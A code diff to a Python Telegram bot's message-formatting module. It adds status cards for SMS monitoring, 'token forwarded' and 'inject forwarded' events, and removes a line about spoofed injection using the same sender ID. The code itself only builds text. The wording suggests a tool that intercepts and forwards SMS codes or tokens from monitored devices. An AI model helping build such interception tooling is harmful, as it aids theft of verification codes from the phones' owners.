@@ -116,37 +116,91 @@ def device_set_keyboard(device: Device) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(rows)
 
 
+def _short_channel_id(channel_id: str) -> str:
+    if len(channel_id) > 12:
+        return f"{channel_id[:5]}..."
+    return channel_id
+
+
+def format_timing_footer(queued_ms: int, total_ms: int) -> str:
+    return f"⏱ queued {queued_ms}ms | total {total_ms}ms"
+
+
+def format_virtus_startup_card(queued_ms: int = 3, total_ms: int = 15) -> str:
+    return (
+        "✅ <b>SUCCESS</b>\n\n"
+        "<pre>"
+        "⚡ INJECT FORWARDED! [STARTUP]\n\n"
+        "📤 Sender: VIRTUS\n"
+        "🔒 Virtus Auto Token + SMS Started\n\n"
+        f"{format_timing_footer(queued_ms, total_ms)}"
+        "</pre>"
+    )
+
+
+def format_virtus_stream_card(
+    sender: str,
+    message: str,
+    queued_ms: int = 3,
+    total_ms: int = 22,
+) -> str:
+    body = message.replace("<", "").replace(">", "").strip()
+    if len(body) > 500:
+        body = body[:500] + "..."
+    return (
+        "✅ <b>SUCCESS</b>\n\n"
+        "<pre>"
+        "⚡ INJECT FORWARDED! [STREAM]\n\n"
+        f"📤 Sender: {sender}\n"
+        f"🔒 {body}\n\n"
+        f"{format_timing_footer(queued_ms, total_ms)}"
+        "</pre>"
+    )
+
+
+def format_virtus_channel_token_card(
+    to_number: str,
+    message: str,
+    queued_ms: int = 5,
+    total_ms: int = 29,
+) -> str:
+    body = message.replace("<", "").replace(">", "").strip()
+    if len(body) > 500:
+        body = body[:500] + "..."
+    return (
+        "✅ <b>SUCCESS</b>\n\n"
+        "<pre>"
+        "🎯 TOKEN FORWARDED! [CHANNEL]\n\n"
+        f"📞 To: {to_number}\n"
+        f"🔒 {body}\n\n"
+        f"{format_timing_footer(queued_ms, total_ms)}"
+        "</pre>"
+    )
+
+
 def format_monitoring_card(
     device: Device,
     profile: MonitorProfile,
     ignored_sms: int = 0,
     test_message: str | None = None,
 ) -> str:
-    sims = get_sim_list(device)
-    sim_index = profile.selected_sim_index or 0
-    active = sims[sim_index] if sims else {"slot": 1, "number": profile.phone_number or "Unknown"}
-    inject_key = make_inject_key(device)
     target = profile.phone_number or "Not set"
-    channel = profile.channel_id or str(profile.telegram_user_id)
+    channel = _short_channel_id(profile.channel_id or str(profile.telegram_user_id))
     auto_stop = profile.auto_stop_minutes or 15
 
     card = (
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
-        "Monitoring Started!\n\n"
-        f"📱 Device: {short_device_id(device.name)} | {get_model_name(device)}\n"
-        f"📶 FROM SIM: {active['slot']} ({active['number']})\n"
-        f"🔑 Inject Key: {inject_key}\n"
-        "📬 Incoming → spoof inject (same sender ID)\n"
-        f"📞 Real SMS → {target}\n"
-        f"📢 Channel: {channel} (last / addchannel only)\n"
+        f"📞 Real SMS -&gt; {target}\n"
+        f"📢 Channel: {channel}\n"
         f"⏱ Auto-stop in {auto_stop} minutes\n"
-        f"📦 Ignored {ignored_sms} old SMS (only NEW after this moment)"
+        f"📦 Ignored {ignored_sms} old SMS (only NEW after this moment)\n"
+        "✅ Test message sent: Virtus Auto Token + SMS Started"
         "</pre>"
     )
 
-    if test_message:
-        card += f"\n\n✅ Test inject OK: {test_message}"
+    if test_message and test_message != "Monitoring active":
+        card += f"\n\n<pre>🔒 Last SMS: {test_message[:80]}</pre>"
 
     return card
 
